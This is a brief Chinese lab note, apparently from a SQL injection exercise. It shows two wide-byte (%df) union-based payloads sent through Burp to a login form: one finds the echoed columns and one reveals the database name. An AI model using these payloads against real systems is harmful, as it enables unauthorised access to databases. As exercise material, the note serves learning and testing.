直接burp抓包



先测回显列，

两列

```
uname=admin%df' union select 1,2#&passwd=admin&submit=Submit
```



爆库

```
uname=admin%df' union select 1,database()#&passwd=admin&submit=Submit
```

 

后续步骤不再赘述...
